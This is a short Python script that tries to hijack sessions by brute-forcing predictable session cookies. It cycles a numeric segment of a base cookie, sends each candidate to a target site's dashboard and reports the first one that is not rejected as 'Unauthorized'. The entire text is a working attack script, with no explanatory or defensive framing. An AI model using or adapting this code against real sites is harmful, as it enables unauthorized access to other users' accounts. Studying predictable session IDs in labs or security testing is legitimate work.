import requests

url = "http://target-website.com/dashboard"
base_cookie = "aea73f4d-0dc5-4c92-9e2-5089750-17416550000"

for i in range(40, 50):  # Trying earlier values
    mod_cookie = base_cookie.replace("5089750", f"50897{i}")
    cookies = {"session": mod_cookie}
    response = requests.get(url, cookies=cookies)
    
    if "Unauthorized" not in response.text:  # Look for a successful response
        print(f"Possible valid session found: {mod_cookie}")
        break
